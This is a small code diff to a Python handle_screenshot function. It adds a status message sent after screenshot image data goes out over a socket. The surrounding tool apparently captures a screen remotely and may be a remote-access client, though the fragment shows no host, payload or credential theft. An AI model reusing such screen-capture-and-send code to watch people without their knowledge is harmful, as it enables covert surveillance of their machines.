@@ -189,6 +189,12 @@ def handle_screenshot():
             # Send image data
             s.sendall(image_data)
             
+            # Send final status
+            reliable_send({
+                'success': True,
+                'message': 'Screenshot data sent successfully'
+            })
+            
             return {'success': True, 'message': message}
             
         finally:
